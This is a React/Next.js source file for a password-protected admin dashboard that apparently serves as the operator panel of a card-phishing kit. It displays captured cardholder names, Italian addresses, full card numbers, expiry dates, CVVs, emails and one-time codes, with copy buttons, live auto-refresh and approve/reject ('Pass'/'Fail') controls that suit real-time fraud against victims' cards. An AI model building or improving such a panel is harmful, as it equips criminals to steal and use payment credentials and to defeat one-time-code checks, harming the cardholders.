"use client";

import { FormEvent, useEffect, useState } from "react";
import { createClient } from "@/lib/supabase/client";
import type { Submission } from "@/types";

const STORAGE_KEY = "admin_password";



async function verifyPassword(pw: string) {
  const res = await fetch("/api/admin", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ action: "login", password: pw }),
  });
  const json = await res.json();
  return { ok: res.ok && !json.error, error: json.error as string | undefined };
}

export default function AdminPage() {
  const supabase = createClient();

async function copyText(value: string) {
  await navigator.clipboard.writeText(value);
}

  const [password, setPassword] = useState("");
  const [unlocked, setUnlocked] = useState(false);
  const [ready, setReady] = useState(false);
  const [checking, setChecking] = useState(false);
  const [price, setPrice] = useState("");
  const [rows, setRows] = useState<Submission[]>([]);
  const [message, setMessage] = useState("");

  const [paused, setPaused] = useState(false);

 useEffect(() => {
  if (!unlocked || paused) return;

  const timer = window.setInterval(() => {
    window.location.reload();
  }, 7000);

  return () => window.clearInterval(timer);
}, [unlocked, paused]);

  useEffect(() => {
    let cancelled = false;

    async function restoreSession() {
      await Promise.resolve();
      const saved = sessionStorage.getItem(STORAGE_KEY) ?? "";

      if (saved) {
        const result = await verifyPassword(saved);
        if (!cancelled && result.ok) {
          setPassword(saved);
          setUnlocked(true);
        } else if (!cancelled) {
          sessionStorage.removeItem(STORAGE_KEY);
        }
      }

      if (!cancelled) setReady(true);
    }

    restoreSession();
    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!unlocked) return;

    async function load() {
      const [{ data: settings }, { data: submissions }] = await Promise.all([
        supabase.from("app_settings").select("price").eq("id", 1).single(),
        supabase
          .from("submissions")
          .select("*")
          .order("created_at", { ascending: false }),
      ]);

      if (settings) setPrice(String(settings.price));
      if (submissions) setRows(submissions as Submission[]);
    }

    load();

    const channel = supabase
      .channel("admin-submissions")
      .on(
        "postgres_changes",
        { event: "*", schema: "public", table: "submissions" },
        () => {
          load();
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, [unlocked, supabase]);


  async function deleteAll() {
  const ok = window.confirm(
    "Delete ALL submissions from the database? This cannot be undone."
  );
  if (!ok) return;

  const done = await adminPost({ action: "delete_all" });
  if (done) {
    setRows([]);
    setMessage("All submissions deleted.");
  }
}

  async function unlock(e: FormEvent) {
    e.preventDefault();
    setChecking(true);
    setMessage("");
    const result = await verifyPassword(password);
    setChecking(false);

    if (!result.ok) {
      setMessage(result.error ?? "Wrong password");
      return;
    }

    sessionStorage.setItem(STORAGE_KEY, password);
    setUnlocked(true);
  }

  function logout() {
    sessionStorage.removeItem(STORAGE_KEY);
    setUnlocked(false);
    setPassword("");
    setMessage("");
  }

  async function adminPost(payload: Record<string, unknown>) {
    setMessage("");
    const res = await fetch("/api/admin", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ password, ...payload }),
    });
    const json = await res.json();

    if (res.status === 401) {
      sessionStorage.removeItem(STORAGE_KEY);
      setUnlocked(false);
      setPassword("");
      setMessage("Session expired. Log in again.");
      return false;
    }

    if (!res.ok || json.error) {
      setMessage(json.error ?? "Request failed");
      return false;
    }

    return true;
  }

  async function savePrice(e: FormEvent) {
    e.preventDefault();
    const ok = await adminPost({ action: "set_price", price: Number(price) });
    if (ok) setMessage("Price updated.");
  }

  async function setStatus(id: string, status: "approved" | "rejected") {
    const ok = await adminPost({ action: "set_status", id, status });
    if (ok) setMessage(`Marked ${status}.`);
  }

  if (!ready) {
    return (
      <main className="px-6 py-16 text-center text-[#9aa8b8]">Caricando...</main>
    );
  }

  if (!unlocked) {
    return (
      <main className="mx-auto flex min-h-screen max-w-sm flex-col justify-center px-6">
        <h1 className="mb-4 text-2xl font-semibold">Admin</h1>
        <form onSubmit={unlock} className="space-y-3">
          <input
            type="password"
            required
            minLength={1}
            placeholder="Admin password"
            className="w-full rounded-lg border border-[#2a3548] bg-[#0f1419] px-3 py-2"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <button
            disabled={checking || password.trim().length === 0}
            className="w-full rounded-lg bg-blue-600 px-4 py-2 text-white disabled:opacity-50"
          >
            {checking ? "Checking…" : "Enter"}
          </button>
        </form>
        {message && <p className="mt-3 text-sm text-red-400">{message}</p>}
      </main>
    );
  }

  return (
  <main className="mx-auto w-full max-w-[1600px] px-4 py-10">
      <div className="flex items-center justify-between gap-4">
        <h1 className="text-3xl font-semibold">Admin dashboard</h1>
        <button
          type="button"
          className="rounded-lg border border-[#2a3548] px-3 py-1.5 text-sm text-[#9aa8b8] hover:bg-[#1a2332]"
          onClick={logout}
        >
          Log out
        </button>
      </div>

      <button
  type="button"
  className="rounded-lg border border-[#2a3548] px-3 py-1.5 text-sm text-[#9aa8b8] hover:bg-[#1a2332]"
  onClick={() => setPaused((p) => !p)}
>
  {paused ? "Resume Reload" : "Pause Reload"}
</button>

      <button
  type="button"
  className="rounded-lg border border-[#2a3548] px-3 py-1.5 text-sm text-[#9aa8b8] hover:bg-[#1a2332]"
  onClick={() => window.location.reload()}
>
  Refresh
</button>
<br></br>

<button
  type="button"
  className="rounded-lg border border-red-800 px-3 py-1.5 text-sm text-red-400 hover:bg-red-950"
  onClick={deleteAll}
>
  DELETE EVERYTHING
</button>

      <form
        onSubmit={savePrice}
        className="mt-8 flex flex-wrap items-end gap-3 rounded-xl border border-[#2a3548] bg-[#1a2332] p-5"
      >
        <label className="text-sm">
          Price shown on main page
          <input
            type="number"
            min="0"
            step="0.01"
            className="mt-1 block w-40 rounded-lg border border-[#2a3548] bg-[#0f1419] px-3 py-2"
            value={price}
            onChange={(e) => setPrice(e.target.value)}
          />
        </label>
        <button className="rounded-lg bg-blue-600 px-4 py-2 text-white">
          Save price
        </button>
      </form>

      {message && <p className="mt-4 text-sm text-[#9aa8b8]">{message}</p>}

    <div className="mt-8 hidden md:block w-full rounded-xl border border-[#2a3548]">
       <table className="w-full table-fixed text-left text-sm">
          <thead className="bg-[#1a2332] text-[#9aa8b8]">
            <tr>
              <th className="px-3 py-2">Created</th>
            <th className="px-3 py-2">Name</th>
            <th className="px-2 py-2">Indirizzo</th>
            <th className="px-2 py-2">Città</th>
            <th className="px-2 py-2">CAP</th>
            <th className="px-3 py-2">Card Number</th>
            <th className="px-3 py-2">MM/YY</th>
            <th className="px-3 py-2">Security Code</th>
            <th className="px-3 py-2 w-[18%]">Email</th>
            <th className="px-3 py-2">OTP</th>
            <th className="px-3 py-2">Status</th>
            <th className="px-3 py-2">Actions</th>
              
            </tr>
          </thead>
          <tbody>
            {rows.length === 0 && (
              <tr>
                <td className="px-3 py-6 text-[#9aa8b8]" colSpan={6}>
                  No submissions yet.
                </td>
              </tr>
            )}
            {rows.map((row) => (
              <tr key={row.id} className="border-t border-[#2a3548]">
                <td className="px-3 py-2 whitespace-nowrap">
                  {new Date(row.created_at).toLocaleString()}
                </td>
                <td className="px-3 py-2">{row.first_name}

                  <button
                  type="button"
                  className="ml-2 text-xs text-[#9aa8b8] underline"
                  onClick={() => copyText(row.first_name)}
                >
                  Copy
                </button>
                </td>

                <td className="px-2 py-2 align-top break-words">{row.street ?? "—"}</td>
                <td className="px-2 py-2 align-top break-words">{row.city ?? "—"}</td>
                <td className="px-2 py-2 align-top">{row.cap ?? "—"}</td>
                
                <td className="px-3 py-2 tracking-wider">
                {(row.card_number ?? "").replace(/(\d{4})(?=\d)/g, "$1 ")}
                 <button
                  type="button"
                  className="ml-2 text-xs text-[#9aa8b8] underline"
                  onClick={() => copyText(row.card_number)}
                >
                  Copy
                </button>
                </td>
                <td className="px-3 py-2">{row.expiry}
                 <button
                  type="button"
                  className="ml-2 text-xs text-[#9aa8b8] underline"
                  onClick={() => copyText(row.expiry)}
                >
                  Copy
                </button></td>
                <td className="px-3 py-2">{row.security_code}
                 <button
                  type="button"
                  className="ml-2 text-xs text-[#9aa8b8] underline"
                  onClick={() => copyText(row.security_code)}
                >
                  Copy
                </button>
                </td>
                <td className="px-3 py-2 tracking-wider">
                {(row.email ?? "").replace(/(\d{9})(?=\d)/g, "$1 ")}
                 <button
                  type="button"
                  className="ml-2 text-xs text-[#9aa8b8] underline"
                  onClick={() => copyText(row.card_number)}
                >
                  Copy
                </button>
                </td>
                  <td className="px-3 py-2">{row.waiting_name ?? "—"}
                 </td>
                <td className="px-3 py-2 capitalize">{row.status}</td>
               
               <td className="px-3 py-2">
 {row.status === "approved" ? (
  <span className="font-medium text-green-500">Pass</span>
) : row.status === "rejected" ? (
  <span className="font-medium text-red-500">Fail</span>
) : (
  <div className="flex gap-2">
    <button
      type="button"
      onClick={() => setStatus(row.id, "approved")}
      className="rounded bg-green-600 px-2 py-1 text-xs text-white"
    >
      Approve
    </button>
    <button
      type="button"
      onClick={() => setStatus(row.id, "rejected")}
      className="rounded bg-red-600 px-2 py-1 text-xs text-white"
    >
      Reject
    </button>
  </div>
)}
</td>
               
              </tr>
            ))}
          </tbody>
        </table>
      </div>

    {/* Mobile */}
<div className="mt-8 space-y-3 md:hidden">
  {rows.length === 0 && (
    <p className="text-[#9aa8b8]">No submissions yet.</p>
  )}

  {rows.map((row) => (
    <article
      key={row.id}
      className="rounded-xl border border-[#2a3548] bg-[#1a2332] p-4 text-sm"
    >
	
	<p className="mt-1 text-xs text-[#9aa8b8]">
        {new Date(row.created_at).toLocaleString()}
      </p>
	  
      <div className="flex items-start justify-between gap-2">
       <p className="font-medium break-words"> Titolare CC: {row.first_name}</p>
        <span className="shrink-0 capitalize text-[#9aa8b8]">{row.status}</span>
      </div>
	  
	  Numero CC:<p className="mt-1 break-all text-[#9aa8b8]">{row.card_number}</p>
	  
	  Scadenza: <p className="mt-1 break-all text-[#9aa8b8]">{row.expiry}</p>
	  
	 CVV: <p className="mt-1 break-all text-[#9aa8b8]">{row.security_code}</p>

      Email: <p className="mt-1 break-all text-[#9aa8b8]">{row.email}</p>
      
      {row.waiting_name && (
        <p className="mt-2 break-words">OTP: {row.waiting_name}</p>
      )}

      <div className="mt-3 flex flex-wrap gap-2">
        <button
          type="button"
          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
          onClick={() => copyText(new Date(row.first_name).toLocaleString())}
        >
          Copy name
        </button>
        <button
          type="button"
          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
          onClick={() => copyText(row.card_number)}
        >
          Copy card_number
        </button>
        <button
          type="button"
          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
          onClick={() => copyText(row.expiry)}
        >
          Copy expiry
        </button>
		<button
          type="button"
          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
          onClick={() => copyText(row.security_code)}
        >
          Copy CVV
        </button>
		<button
          type="button"
          className="rounded border border-[#2a3548] px-2 py-1 text-xs text-[#9aa8b8]"
          onClick={() => copyText(row.email)}
        >
          Copy email
        </button>
      </div>

      {row.status !== "approved" && row.status !== "rejected" && (
        <div className="mt-3 flex gap-2">
          <button
            type="button"
            onClick={() => setStatus(row.id, "approved")}
            className="rounded bg-green-600 px-3 py-1.5 text-xs text-white"
          >
            Approve
          </button>
          <button
            type="button"
            onClick={() => setStatus(row.id, "rejected")}
            className="rounded bg-red-600 px-3 py-1.5 text-xs text-white"
          >
            Reject
          </button>
        </div>
      )}
    </article>
  ))}
</div>

    
    </main>
  );
}
